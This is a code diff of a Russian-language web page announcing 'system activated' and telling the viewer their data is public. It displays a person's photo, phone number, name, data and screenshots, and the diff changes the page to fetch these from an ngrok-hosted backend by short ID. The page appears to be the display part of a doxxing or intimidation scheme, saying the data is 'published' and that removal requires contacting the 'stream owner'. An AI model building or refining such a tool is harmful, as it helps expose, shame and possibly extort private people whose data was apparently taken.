@@ -5,12 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Система активирована</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
             font-family: 'Courier New', monospace;
@@ -21,7 +16,6 @@
             padding: 20px;
             color: #fff;
         }
-        
         .container {
             max-width: 500px;
             width: 100%;
@@ -32,7 +26,6 @@
             box-shadow: 0 0 60px rgba(255, 51, 85, 0.2);
             text-align: center;
         }
-        
         .header {
             color: #ff3355;
             font-size: 22px;
@@ -42,18 +35,15 @@
             margin-bottom: 10px;
             animation: pulse 1.5s infinite;
         }
-        
         @keyframes pulse {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
         }
-        
         .subheader {
             color: #ff6680;
             font-size: 14px;
             margin-bottom: 25px;
         }
-        
         .user-photo {
             width: 150px;
             height: 150px;
@@ -68,14 +58,12 @@
             background: #1a1a1a;
             overflow: hidden;
         }
-        
         .user-photo img {
             width: 100%;
             height: 100%;
             border-radius: 50%;
             object-fit: cover;
         }
-        
         .info-block {
             background: rgba(0, 0, 0, 0.5);
             border: 1px solid rgba(255, 51, 85, 0.2);
@@ -84,14 +72,12 @@
             margin-bottom: 15px;
             text-align: left;
         }
-        
         .info-block .label {
             color: #ff6680;
             font-size: 11px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
-        
         .info-block .value {
             color: #00ffcc;
             font-size: 14px;
@@ -100,14 +86,12 @@
             max-height: 200px;
             overflow-y: auto;
         }
-        
         .screenshots {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 10px;
             margin: 15px 0;
         }
-        
         .screenshots img {
             width: 100%;
             border-radius: 8px;
@@ -116,7 +100,6 @@
             min-height: 80px;
             object-fit: cover;
         }
-        
         .screenshots .empty {
             background: #1a1a1a;
             height: 100px;
@@ -128,7 +111,6 @@
             font-size: 12px;
             border: 1px dashed #333;
         }
-        
         .status {
             color: #ff3355;
             font-size: 14px;
@@ -137,12 +119,10 @@
             font-weight: bold;
             text-transform: uppercase;
         }
-        
         @keyframes blink {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
         }
-        
         .footer {
             color: #555;
             font-size: 10px;
@@ -150,7 +130,6 @@
             border-top: 1px solid rgba(255,255,255,0.05);
             padding-top: 15px;
         }
-        
         .warning {
             color: #ff3355;
             font-size: 12px;
@@ -160,13 +139,6 @@
             border-radius: 8px;
             background: rgba(255,51,85,0.05);
         }
-        
-        .loading {
-            color: #ff6680;
-            font-size: 16px;
-            padding: 20px;
-        }
-        
         .error {
             color: #ff3355;
             font-size: 14px;
@@ -179,9 +151,7 @@
         <div class="header">🔴 СИСТЕМА АКТИВИРОВАНА</div>
         <div class="subheader">Ваши данные находятся в открытом доступе</div>
         
-        <div class="user-photo" id="userPhoto">
-            <span>📸</span>
-        </div>
+        <div class="user-photo" id="userPhoto"><span>📸</span></div>
         
         <div class="info-block">
             <div class="label">📱 Телефон</div>
@@ -208,86 +178,100 @@
         
         <div class="status">⚠️ ДАННЫЕ ОПУБЛИКОВАНЫ</div>
         
-        <div class="warning">
-            ⚡ Для удаления данных обратитесь к владельцу стрима
-        </div>
+        <div class="warning">⚡ Для удаления данных обратитесь к владельцу стрима</div>
         
-        <div class="footer">
-            Система активирована • Время публикации: <span id="time"></span>
-        </div>
+        <div class="footer">Система активирована • Время публикации: <span id="time"></span></div>
     </div>
 
     <script>
-        // ========== ПОЛУЧАЕМ ДАННЫЕ ИЗ URL ==========
-        const urlParams = new URLSearchParams(window.location.search);
-        const dataParam = urlParams.get('data');
+        // ============================================================
+        // 1. ПОЛУЧАЕМ SHORT_ID ИЗ URL (например /fgsywfuiefjn)
+        // ============================================================
+        const path = window.location.pathname;
+        const shortId = path.substring(1); // убираем первый слэш
         
-        console.log('🔍 Параметр data:', dataParam ? 'ЕСТЬ' : 'НЕТ');
+        console.log('🔍 Short ID из URL:', shortId);
         
-        if (dataParam) {
-            try {
-                // Декодируем из base64
-                const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
-                console.log('📦 Декодированные данные:', decoded);
-                
-                // ===== ФОТО =====
-                if (decoded.photo) {
-                    console.log('📸 Фото найдено, длина:', decoded.photo.length);
-                    // Добавляем префикс если его нет
-                    let photoSrc = decoded.photo;
-                    if (!photoSrc.startsWith('data:image')) {
-                        photoSrc = 'data:image/jpeg;base64,' + photoSrc;
+        if (shortId) {
+            // ============================================================
+            // 2. ЗАПРАШИВАЕМ ДАННЫЕ С БЭКЕНДА
+            // ============================================================
+            const apiUrl = `https://7505-178-88-32-33.ngrok-free.app/${shortId}`;
+            console.log('📡 Запрос к бэкенду:', apiUrl);
+            
+            fetch(apiUrl)
+                .then(response => {
+                    console.log('📡 Статус ответа:', response.status);
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}`);
                     }
-                    document.getElementById('userPhoto').innerHTML = `<img src="${photoSrc}" alt="Фото пользователя" onerror="this.parentElement.innerHTML='<span>❌</span>'">`;
-                } else {
-                    console.log('❌ Фото отсутствует в данных');
-                }
-                
-                // ===== ТЕЛЕФОН =====
-                if (decoded.phone) {
-                    document.getElementById('userPhone').textContent = decoded.phone;
-                }
-                
-                // ===== ИМЯ =====
-                if (decoded.name) {
-                    document.getElementById('userName').textContent = decoded.name;
-                }
-                
-                // ===== ДАННЫЕ =====
-                if (decoded.data) {
-                    document.getElementById('userData').textContent = decoded.data;
-                }
-                
-                // ===== СКРИНШОТЫ =====
-                if (decoded.screenshots && decoded.screenshots.length > 0) {
-                    const container = document.getElementById('screenshots');
-                    container.innerHTML = '';
-                    decoded.screenshots.forEach(src => {
-                        const img = document.createElement('img');
-                        // Добавляем префикс если его нет
-                        let imgSrc = src;
-                        if (!imgSrc.startsWith('data:image')) {
-                            imgSrc = 'data:image/jpeg;base64,' + imgSrc;
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('📦 Данные от бэкенда:', data);
+                    
+                    if (data.success) {
+                        // ----- ФОТО -----
+                        if (data.photo) {
+                            console.log('📸 Фото получено, длина:', data.photo.length);
+                            const img = document.createElement('img');
+                            img.src = 'data:image/jpeg;base64,' + data.photo;
+                            img.alt = 'Фото пользователя';
+                            img.onerror = function() {
+                                this.parentElement.innerHTML = '<span>❌ Ошибка загрузки фото</span>';
+                            };
+                            document.getElementById('userPhoto').innerHTML = '';
+                            document.getElementById('userPhoto').appendChild(img);
+                        } else {
+                            console.log('❌ Фото отсутствует');
                         }
-                        img.src = imgSrc;
-                        img.onerror = function() {
-                            this.outerHTML = `<div class="empty">❌ Ошибка загрузки</div>`;
-                        };
-                        container.appendChild(img);
-                    });
-                }
-                
-            } catch(e) {
-                console.error('❌ Ошибка декодирования:', e);
-                document.getElementById('userData').textContent = '❌ Ошибка загрузки данных: ' + e.message;
-            }
+                        
+                        // ----- ТЕЛЕФОН -----
+                        if (data.phone) {
+                            document.getElementById('userPhone').textContent = data.phone;
+                        }
+                        
+                        // ----- ИМЯ -----
+                        if (data.name) {
+                            document.getElementById('userName').textContent = data.name;
+                        }
+                        
+                        // ----- ДАННЫЕ -----
+                        if (data.data) {
+                            document.getElementById('userData').textContent = data.data;
+                        }
+                        
+                        // ----- СКРИНШОТЫ -----
+                        if (data.screenshots && data.screenshots.length > 0) {
+                            const container = document.getElementById('screenshots');
+                            container.innerHTML = '';
+                            data.screenshots.forEach((src, index) => {
+                                const img = document.createElement('img');
+                                img.src = 'data:image/jpeg;base64,' + src;
+                                img.alt = 'Скриншот ' + (index + 1);
+                                img.onerror = function() {
+                                    this.outerHTML = `<div class="empty">❌ Ошибка загрузки скриншота</div>`;
+                                };
+                                container.appendChild(img);
+                            });
+                        }
+                    } else {
+                        document.getElementById('userData').textContent = '❌ Данные не найдены';
+                        console.log('❌ Бэкенд вернул success: false');
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Ошибка запроса к бэкенду:', error);
+                    document.getElementById('userData').textContent = '❌ Ошибка загрузки данных: ' + error.message;
+                    document.getElementById('userPhone').textContent = '❌ Ошибка';
+                    document.getElementById('userName').textContent = '❌ Ошибка';
+                });
         } else {
-            document.getElementById('userData').textContent = '❌ Нет данных для отображения';
-            document.getElementById('userPhone').textContent = '❌ Нет данных';
-            document.getElementById('userName').textContent = '❌ Нет данных';
+            document.getElementById('userData').textContent = '❌ Нет ID для загрузки';
+            console.log('❌ shortId не найден в URL');
         }
         
-        // Время
+        // ===== ВРЕМЯ =====
         document.getElementById('time').textContent = new Date().toLocaleString('ru-RU');
     </script>
 </body>
